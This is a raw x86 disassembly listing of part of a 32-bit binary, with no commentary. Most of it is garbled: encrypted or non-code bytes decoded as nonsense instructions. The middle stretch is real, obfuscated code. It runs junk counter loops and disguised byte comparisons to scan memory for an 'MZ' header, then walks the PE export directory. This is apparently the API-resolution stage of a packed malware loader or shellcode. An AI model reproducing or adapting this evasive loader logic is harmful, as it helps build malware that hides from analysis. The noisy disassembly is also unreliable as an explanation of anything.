  40e2d1:	push   ecx
  40e2d2:	scas   eax,DWORD PTR es:[edi]
  40e2d3:	add    al,0xeb
  40e2d5:	cmp    bh,BYTE PTR [ebp+0x4b]
  40e2d8:	xor    esi,edi
  40e2da:	lea    esi,[edx+edx*4]
  40e2dd:	inc    esp
  40e2de:	cmp    BYTE PTR [edx],0xfb
  40e2e1:	out    0x41,al
  40e2e3:	shr    BYTE PTR [ebp-0x21],1
  40e2e6:	dec    esi
  40e2e7:	je     0x40e35b
  40e2e9:	sub    al,0x70
  40e2eb:	pushf  
  40e2ec:	pop    ebx
  40e2ed:	cmp    edx,DWORD PTR [edx+ecx*8-0x3]
  40e2f1:	fmul   DWORD PTR [eax-0x2fac02c2]
  40e2f7:	push   esp
  40e2f8:	ins    BYTE PTR es:[edi],dx
  40e2f9:	std    
  40e2fa:	jbe    0x40e33a
  40e2fc:	dec    ebp
  40e2fd:	pop    ds
  40e2fe:	xor    eax,DWORD PTR [ecx-0x5b0c52d7]
  40e304:	ror    edi,cl
  40e306:	mov    ebp,0x55b76020
  40e30b:	les    esp,FWORD PTR [edx]
  40e30d:	dec    ebx
  40e30e:	stc    
  40e30f:	pop    edx
  40e310:	mov    ah,0x14
  40e312:	push   ss
  40e313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e314:	push   esi
  40e315:	sub    eax,0xd2d83f72
  40e31a:	fcmovne st,st(0)
  40e31c:	in     eax,0x8e
  40e31e:	addr16 mov esp,0x662b98e8
  40e324:	mov    ebp,edi
  40e326:	je     0x40e380
  40e328:	add    eax,0xe7cfd683
  40e32d:	hlt    
  40e32e:	cmp    eax,0xa4ddfd50
  40e333:	inc    edx
  40e334:	fmul   DWORD PTR [ebx+0x3d768136]
  40e33a:	rep ins DWORD PTR es:[edi],dx
  40e33c:	push   ecx
  40e33d:	stc    
  40e33e:	je     0x40e31b
  40e340:	(bad)  
  40e341:	je     0x40e2dc
  40e343:	dec    eax
  40e344:	dec    edx
  40e345:	xor    bl,BYTE PTR [ecx+esi*2-0x72]
  40e349:	loope  0x40e301
  40e34b:	push   ebx
  40e34c:	or     ch,bh
  40e34e:	mov    dl,0x8d
  40e350:	push   esp
  40e351:	mov    eax,ds:0x2d07fcb3
  40e356:	xor    al,0x7a
  40e358:	push   edx
  40e359:	push   eax
  40e35a:	mov    edi,0x9d44cfde
  40e35f:	mov    ecx,DWORD PTR [bp+di]
  40e362:	loop   0x40e396
  40e364:	leave  
  40e365:	mov    dl,0xda
  40e367:	mov    al,0x23
  40e369:	loopne 0x40e3a7
  40e36b:	shr    BYTE PTR [ecx+0x67],0x66
  40e36f:	daa    
  40e370:	mov    dl,0x31
  40e372:	popf   
  40e373:	shl    BYTE PTR [edx],cl
  40e375:	push   ecx
  40e376:	das    
  40e377:	pop    eax
  40e378:	loop   0x40e38b
  40e37a:	xchg   ebp,eax
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x751f5ef2
  40e671:	jns    0x40e6e8
  40e673:	jae    0x40e63f
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e64c
  40e67c:	sub    BYTE PTR [esi-0x6d623db1],dl
  40e682:	mov    edi,0xedc50f4e
  40e687:	movups xmm2,XMMWORD PTR [eax+ecx*4+0x55]
  40e68c:	retf   
  40e68d:	mov    ds,esp
  40e68f:	mov    dh,0x71
  40e691:	mov    ecx,DWORD PTR ds:0xae952aa9
  40e697:	fwait
  40e698:	stc    
  40e699:	out    0xcc,al
  40e69b:	adc    dl,BYTE PTR [eax]
  40e69d:	je     0x40e69f
  40e69f:	mov    dl,0x86
  40e6a1:	inc    ebp
  40e6a2:	mov    al,0xde
  40e6a4:	scas   eax,DWORD PTR es:[edi]
  40e6a5:	out    0x51,eax
  40e6a7:	arpl   WORD PTR [ebx+0x272d1ea1],ax
  40e6ad:	adc    al,0xc7
  40e6af:	dec    esp
  40e6b0:	ja     0x40e687
  40e6b2:	jl     0x40e6e6
  40e6b4:	adc    BYTE PTR [edi-0x33],bl
  40e6b7:	fwait
  40e6b8:	jo     0x40e651
  40e6ba:	hlt    
  40e6bb:	sub    edi,DWORD PTR [esi]
  40e6bd:	mov    BYTE PTR [ebx-0x54],al
  40e6c0:	mul    BYTE PTR [ebx+edi*4]
  40e6c3:	cmp    edi,ecx
  40e6c5:	xchg   ebx,eax
  40e6c6:	int    0x26
  40e6c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c9:	mov    esi,0xbb1f2d12
  40e6ce:	lock leave 
  40e6d0:	in     eax,0x29
  40e6d2:	mov    al,0x29
  40e6d4:	inc    ebx
  40e6d5:	mov    BYTE PTR [edx],cl
  40e6d7:	mul    BYTE PTR [esi]
  40e6d9:	out    dx,al
  40e6da:	out    dx,eax
  40e6db:	adc    DWORD PTR [eax-0x78],ebx
  40e6de:	add    dh,BYTE PTR [edi+0x50acd76b]
  40e6e4:	in     eax,dx
  40e6e5:	jno    0x40e70c
  40e6e7:	dec    ebp
  40e6e8:	cdq    
  40e6e9:	cmp    esi,DWORD PTR [edi-0x9]
  40e6ec:	mov    eax,0x9ea106ae
  40e6f1:	mov    al,ds:0xd9969c3
  40e6f6:	mov    ebx,esp
  40e6f8:	bound  ebx,QWORD PTR [ecx]
  40e6fa:	ins    BYTE PTR es:[edi],dx
  40e6fb:	out    0xb2,al
  40e6fd:	and    ebp,DWORD PTR [ecx]
  40e6ff:	lock and DWORD PTR [esi+0x5e],esp
  40e703:	and    eax,0xb8338ce6
  40e708:	jbe    0x40e707
  40e70a:	fdiv   DWORD PTR [edi-0x74]
  40e70d:	xchg   ebx,eax
  40e70e:	xchg   ebp,eax
  40e70f:	loope  0x40e73c
  40e711:	sub    ah,BYTE PTR [ecx]
  40e713:	xchg   ebx,eax
  40e714:	or     BYTE PTR [ebp+0x43],ah
  40e717:	push   esi
  40e718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e719:	mov    ch,0xdd
  40e71b:	push   ecx
  40e71c:	inc    ecx
  40e71d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e71e:	mov    esp,0x38d55aaf
  40e723:	icebp  
  40e724:	sbb    ch,BYTE PTR [ecx-0x21]
  40e727:	mov    ah,0x67
  40e729:	push   0x3aa203f5
  40e72e:	sbb    BYTE PTR [ecx-0x1f040d9e],dh
  40e734:	cmp    DWORD PTR [edi+ecx*2],edi
  40e737:	mov    ebp,0x47fb5e86
  40e73c:	jmp    0x40e704
  40e73e:	in     al,dx
  40e73f:	mov    bl,0x63
  40e741:	or     al,BYTE PTR [edx]
  40e743:	mov    cl,0x35
  40e745:	dec    ebx
  40e746:	retf   0xa216
  40e749:	stc    
  40e74a:	xchg   DWORD PTR [eax],ebp
  40e74c:	mov    edx,0x5ddf704f
  40e751:	push   es
  40e752:	push   ebp
  40e753:	or     cl,bh
  40e755:	in     al,0x6b
  40e757:	add    DWORD PTR [ecx-0x25],0xffffffe7
  40e75b:	clc    
  40e75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75d:	sbb    bh,BYTE PTR ds:0x42cd117
  40e763:	push   edx
  40e764:	xor    al,0xa9
  40e766:	sub    edi,ebx
  40e768:	out    dx,al
  40e769:	and    al,0xcf
  40e76b:	rcr    BYTE PTR [ebx+0x6e43550],cl
  40e771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e772:	sub    ebx,edx
  40e774:	xchg   DWORD PTR [edx],esp
  40e776:	jle    0x40e771
  40e778:	add    eax,0x15c64a9a
  40e77d:	enter  0x750b,0xfd
  40e781:	xchg   ebp,eax
  40e782:	cli    
  40e783:	popf   
  40e784:	push   es
  40e785:	push   ds
  40e786:	and    cl,cl
  40e788:	aas    
  40e789:	(bad)  
  40e78a:	int    0xb8
  40e78c:	add    al,BYTE PTR [edx-0x3a]
  40e78f:	mov    dh,0x8a
  40e791:	jecxz  0x40e7f6
  40e793:	jb     0x40e764
  40e795:	inc    ebp
  40e796:	mov    ds:0xf66f049,eax
  40e79b:	xchg   ecx,eax
  40e79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e79d:	xor    edi,DWORD PTR [esi+0x6983e198]
  40e7a3:	xchg   eax,ebp
  40e7a5:	nop    DWORD PTR [eax]
  40e7a8:	add    bh,al
  40e7aa:	push   0xb3300f22
  40e7af:	int3   
  40e7b0:	jge    0x40e796
  40e7b2:	pop    ecx
  40e7b3:	fild   QWORD PTR [ebx+edx*1+0x8]
  40e7b7:	pop    es
  40e7b8:	mov    WORD PTR [edi-0x4e4caf9c],cs
  40e7be:	or     eax,0x55d69818
  40e7c3:	mov    ebp,0xf7a74b0c
  40e7c8:	sub    al,0x26
  40e7ca:	jnp    0x40e80e
  40e7cc:	xchg   esp,eax
  40e7cd:	xlat   BYTE PTR ds:[ebx]
  40e7ce:	ins    DWORD PTR es:[edi],dx
  40e7cf:	add    DWORD PTR [esi+0x79],edx
  40e7d2:	xor    ch,dl
  40e7d4:	ins    DWORD PTR es:[edi],dx
  40e7d5:	mov    ecx,0xbc3d515d
  40e7da:	xchg   ebx,eax
  40e7db:	dec    ebp
  40e7dc:	and    DWORD PTR [edx+0x58],ebp
  40e7df:	ror    BYTE PTR [eax+0x49b0b6a7],cl
  40e7e5:	test   al,0x8b
  40e7e7:	or     BYTE PTR [esp],dh
  40e7ea:	mov    al,ds:0xec3c033f
  40e7ef:	ins    BYTE PTR es:[edi],dx
  40e7f0:	mov    dh,0x7e
  40e7f2:	(bad)  
  40e7f3:	fimul  DWORD PTR [ebx-0x6e]
  40e7f6:	ret    0x132f
  40e7f9:	sahf   
  40e7fa:	mov    cl,0x4e
  40e7fc:	add    BYTE PTR [edi+ebx*4],dh
  40e7ff:	std    
  40e800:	pop    esi
  40e801:	xor    al,0x74
  40e803:	mov    edi,0x5f705dd9
  40e808:	or     DWORD PTR [ebp-0x5d],esi
  40e80b:	sbb    DWORD PTR [ebp-0x51f93759],0x2278e2cd
  40e815:	pusha  
  40e816:	cmp    ecx,DWORD PTR [eax+0x4a]
  40e819:	or     ecx,DWORD PTR [eax+edx*8]
  40e81c:	stc    
  40e81d:	out    0x4f,eax
  40e81f:	or     BYTE PTR [esi-0x3f],dl
  40e822:	enter  0x5e86,0x5
  40e826:	outs   dx,DWORD PTR ds:[esi]
  40e827:	in     al,dx
  40e828:	jg     0x40e818
  40e82a:	and    al,0x7e
  40e82c:	push   eax
  40e82d:	xchg   BYTE PTR [ebp+0x102c87f9],dl
  40e833:	(bad)  
  40e834:	out    dx,eax
  40e835:	cli    
  40e836:	int3   
  40e837:	shr    BYTE PTR [edx],cl
  40e839:	fistp  WORD PTR [esp+edi*8+0x6a]
  40e83d:	mov    edi,0xf2d2f074
  40e842:	pushf  
  40e843:	les    eax,FWORD PTR [esi+0x40]
  40e846:	dec    esp
  40e847:	sbb    DWORD PTR [edi+0x76b0ef80],ebx
  40e84d:	in     eax,0x8f
  40e84f:	dec    edi
  40e850:	inc    ebp
  40e851:	push   edi
  40e852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e853:	leave  
  40e854:	test   DWORD PTR [eax+eiz*8+0x22],esi
  40e858:	retf   
  40e859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e85a:	mov    bl,BYTE PTR [edx+0x38588a78]
  40e860:	addr16 mov esp,0x415398f4
  40e866:	lods   eax,DWORD PTR ds:[esi]
  40e867:	test   BYTE PTR [ecx],ah
  40e869:	sbb    DWORD PTR [eax-0x51],esp
  40e86c:	fwait
  40e86d:	aas    
  40e86e:	bound  edx,QWORD PTR [ebp-0x6b]
  40e871:	push   0x9454750b
  40e876:	cs and al,0x24
  40e879:	xlat   BYTE PTR ds:[ebx]
  40e87a:	xor    BYTE PTR [esi],cl
  40e87c:	gs pop esp
  40e87e:	adc    BYTE PTR [eax-0x73],al
  40e881:	and    al,0xbb
  40e883:	add    eax,0x60e6de99
  40e888:	test   BYTE PTR [ecx+0x35],ah
  40e88b:	mov    dl,0x7d
  40e88d:	mov    ah,BYTE PTR [edx+edx*2+0x2113919b]
  40e894:	fadd   st(5),st
  40e896:	push   ds
  40e897:	dec    eax
  40e898:	mov    esi,0xf93444c4
  40e89d:	sbb    DWORD PTR [ecx+0x13b60e55],ebp
  40e8a3:	mov    cl,0x2b
  40e8a5:	loopne 0x40e91d
  40e8a7:	lea    ebp,[edi-0x4b]
  40e8aa:	jle    0x40e853
  40e8ac:	jle    0x40e923
  40e8ae:	adc    bl,ch
  40e8b0:	xor    al,0x5a
  40e8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b3:	mov    eax,0xae27f4a1
  40e8b8:	retf   0x32c9
  40e8bb:	in     al,0x90
  40e8bd:	cdq    
  40e8be:	push   edx
  40e8bf:	aaa    
  40e8c0:	stos   DWORD PTR es:[edi],eax
  40e8c1:	cs inc edx
  40e8c3:	sbb    bh,BYTE PTR [ebx+0x4c125cac]
  40e8c9:	shl    DWORD PTR [ebp+eax*8-0x28],1
  40e8cd:	mov    ah,0x65
  40e8cf:	dec    edx
  40e8d0:	inc    edx
  40e8d1:	int3   
  40e8d2:	mov    eax,DWORD PTR [edx]
  40e8d4:	cwde   
  40e8d5:	mov    ch,0x44
  40e8d7:	xor    edi,DWORD PTR [esi-0x79f50b92]
  40e8dd:	int3   
  40e8de:	pop    ebp
  40e8df:	jg     0x40e8b0
  40e8e1:	aad    0x2e
  40e8e3:	adc    DWORD PTR [ebx+esi*1-0x14aaddc6],ebx
  40e8ea:	int3   
  40e8eb:	mov    bh,0x62
  40e8ed:	out    0x75,eax
  40e8ef:	leave  
  40e8f0:	es xchg ebp,eax
  40e8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f3:	mov    edx,0x205f6dea
  40e8f8:	or     cl,BYTE PTR [edx+eax*4-0x7c]
  40e8fc:	out    dx,eax
  40e8fd:	je     0x40e8c8
  40e8ff:	push   edi
  40e900:	xor    BYTE PTR [ecx+0x375ef149],al
  40e906:	inc    eax
  40e907:	fimul  DWORD PTR [ecx+0x217faa5a]
  40e90d:	ins    DWORD PTR es:[edi],dx
  40e90e:	push   ds
  40e90f:	jb     0x40e97e
  40e911:	cmp    eax,0x2c8abbbf
  40e916:	adc    al,0x2b
  40e918:	(bad)  
  40e919:	js     0x40e93b
  40e91b:	xchg   DWORD PTR [edi+0x7c266c26],edx
  40e921:	repz je 0x40e996
  40e924:	jle    0x40e916
  40e926:	push   esp
  40e927:	int3   
  40e928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e929:	sti    
  40e92a:	or     ebx,eax
  40e92c:	sbb    ch,bl
  40e92e:	inc    edx
  40e92f:	rol    BYTE PTR [eax-0x3],0x76
  40e933:	jbe    0x40e9b0
  40e935:	daa    
  40e936:	adc    eax,0x21689fa0
  40e93b:	pop    ss
  40e93c:	mov    cl,0xbc
  40e93e:	mov    eax,0xc1e4b2c6
  40e943:	sbb    al,0x6e
  40e945:	inc    esp
  40e946:	jne    0x40e954
  40e948:	or     DWORD PTR [esp+ecx*2-0x7f4fb78b],0x2e
  40e950:	int    0x67
  40e952:	(bad)  
  40e953:	repz ss clc 
  40e956:	sbb    al,0xea
  40e958:	loopne 0x40e955
  40e95a:	push   0x3f
  40e95c:	push   0x6f760fcd
  40e961:	sahf   
  40e962:	imul   edx,DWORD PTR [ebx+0x3f510b6d],0xffffff9f
  40e969:	cmp    BYTE PTR [esi+0x7b],dl
  40e96c:	call   0xdb77:0x26685687
  40e973:	dec    edx
  40e974:	xchg   esi,eax
  40e975:	scas   eax,DWORD PTR es:[edi]
  40e976:	jo     0x40e90f
  40e978:	cmp    BYTE PTR [eax+0x6],0xcb
  40e97c:	xchg   BYTE PTR [edx],ah
  40e97e:	xchg   edx,eax
  40e97f:	mov    ebp,0xe1d1bf1b
  40e984:	sbb    esi,esp
  40e986:	scas   al,BYTE PTR es:[edi]
  40e987:	push   esi
  40e988:	jne    0x40e9ff
  40e98a:	mov    ah,0x68
  40e98c:	mov    ebx,0x7a74c7bc
  40e991:	das    
  40e992:	inc    edx
  40e993:	fcmovb st,st(2)
  40e995:	add    BYTE PTR [edx],dl
  40e997:	sub    ch,BYTE PTR [edi+0x6a]
  40e99a:	adc    DWORD PTR [edx-0x16],edi
  40e99d:	ds repz xchg edx,eax
  40e9a0:	iret   
  40e9a1:	and    al,0x41
  40e9a3:	(bad)  
  40e9a4:	and    DWORD PTR [eax+eiz*4+0x54e7934a],eax
  40e9ab:	mov    BYTE PTR [eax+0x6d],bh
  40e9ae:	pushf  
  40e9af:	jnp    0x40e955
  40e9b1:	idiv   DWORD PTR [eax-0x694ff63]
  40e9b7:	xchg   edx,eax
  40e9b8:	es cli 
  40e9ba:	or     BYTE PTR ds:0xddda258b,ch
  40e9c0:	out    0x4c,eax
  40e9c2:	daa    
  40e9c3:	loope  0x40e954
  40e9c5:	cs scas al,BYTE PTR es:[edi]
  40e9c7:	inc    edx
  40e9c8:	out    0x6e,al
  40e9ca:	fist   DWORD PTR [eax]
  40e9cc:	leave  
  40e9cd:	pop    ds
  40e9ce:	or     ecx,DWORD PTR [edi-0x58]
  40e9d1:	mov    al,0xa4
  40e9d3:	push   edi
  40e9d4:	mov    edi,0xe0494988
  40e9d9:	into   
  40e9da:	sub    al,0xd9
  40e9dc:	imul   eax,DWORD PTR [edx+edi*4-0x1b515ee5],0x3d
  40e9e4:	je     0x40ea45
  40e9e6:	jecxz  0x40e9a6
  40e9e8:	adc    al,0x17
  40e9ea:	mov    bh,0x65
  40e9ec:	mov    BYTE PTR [esi-0x5c1e7053],bh
  40e9f2:	dec    esi
  40e9f3:	aas    
  40e9f4:	jl     0x40ea1a
  40e9f6:	xor    esp,eax
  40e9f8:	rcl    BYTE PTR [ebp-0x4d],cl
  40e9fb:	es ins DWORD PTR es:[edi],dx
  40e9fd:	fiadd  DWORD PTR [edi+0x9]
  40ea00:	in     eax,0x8e
  40ea02:	retf   
  40ea03:	stos   DWORD PTR es:[edi],eax
  40ea04:	jo     0x40ea0d
  40ea06:	ret    0x5320
  40ea09:	rcr    edi,cl
  40ea0b:	pop    es
  40ea0c:	mov    ah,0xd1
  40ea0e:	fs pop es
  40ea10:	loopne 0x40ea03
  40ea12:	ins    BYTE PTR es:[edi],dx
  40ea13:	pop    ebx
  40ea14:	sbb    DWORD PTR [edx+0x2c],eax
  40ea17:	sti    
  40ea18:	xchg   edx,eax
  40ea19:	jns    0x40ea61
  40ea1b:	mov    esi,0x786bdf91
  40ea20:	repnz push 0x8ff9907f
  40ea26:	mov    esi,0xb9106f62
  40ea2b:	sbb    edi,DWORD PTR [esi+ebp*1+0x76366a9b]
  40ea32:	and    BYTE PTR [edi+ebp*1-0x9],0x6d
  40ea37:	and    DWORD PTR [ecx+0x14],edx
  40ea3a:	sahf   
  40ea3b:	aam    0x18
  40ea3d:	mov    bh,0x21
  40ea3f:	pop    ebx
  40ea40:	adc    edi,esp
  40ea42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea43:	imul   cl
  40ea45:	fisttp QWORD PTR [ecx-0x67]
  40ea48:	lds    eax,FWORD PTR [ebx-0x2b471b08]
  40ea4e:	into   
  40ea4f:	ficom  DWORD PTR [edi-0x39]
  40ea52:	pop    ebp
  40ea53:	test   BYTE PTR [esi+0x9],bh
  40ea56:	sbb    cl,BYTE PTR [ebx+0x4f]
  40ea59:	(bad)  
  40ea5a:	pop    esp
  40ea5b:	jo     0x40ea81
  40ea5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5e:	mov    dh,0xe5
  40ea60:	xor    BYTE PTR [ebx],ah
  40ea62:	cwde   
  40ea63:	retf   
  40ea64:	repz xchg esp,eax
  40ea66:	add    DWORD PTR [ecx+0x26ae6569],edi
  40ea6c:	push   eax
  40ea6d:	call   0xf18c:0x86e27e2e
  40ea74:	adc    ecx,DWORD PTR [ebx-0x32]
  40ea77:	add    edi,0x41
  40ea7a:	jbe    0x40eaaa
  40ea7c:	or     DWORD PTR [edi-0x1c],edi
  40ea7f:	dec    ebx
  40ea80:	ja     0x40eaeb
  40ea82:	or     ebp,DWORD PTR [edi-0x64a67a6c]
  40ea88:	jno    0x40eabb
  40ea8a:	jp     0x40ea55
  40ea8c:	and    edi,DWORD PTR [edi]
  40ea8e:	adc    eax,0x6e64f2cf
  40ea93:	dec    eax
  40ea94:	add    DWORD PTR [eax+0x7af2b8d3],0xacaadd6a
  40ea9e:	aas    
  40ea9f:	add    eax,0xf9f8a965
  40eaa4:	inc    DWORD PTR [esp+eiz*8]
  40eaa7:	(bad)  
  40eaa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaaa:	pop    ds
  40eaab:	cmp    eax,esi
  40eaad:	jbe    0x40ea99
  40eaaf:	(bad)  
  40eab0:	mul    BYTE PTR [ecx+0x3a]
  40eab3:	das    
  40eab4:	dec    esp
  40eab5:	inc    esp
  40eab6:	retf   
  40eab7:	pop    esp
  40eab8:	sub    BYTE PTR [esi+esi*4+0x4e],ah
  40eabc:	ss push cs
  40eabe:	ss dec ecx
  40eac0:	mov    esi,0x2b1732c6
  40eac5:	xor    ch,BYTE PTR ss:[ebx+0x74]
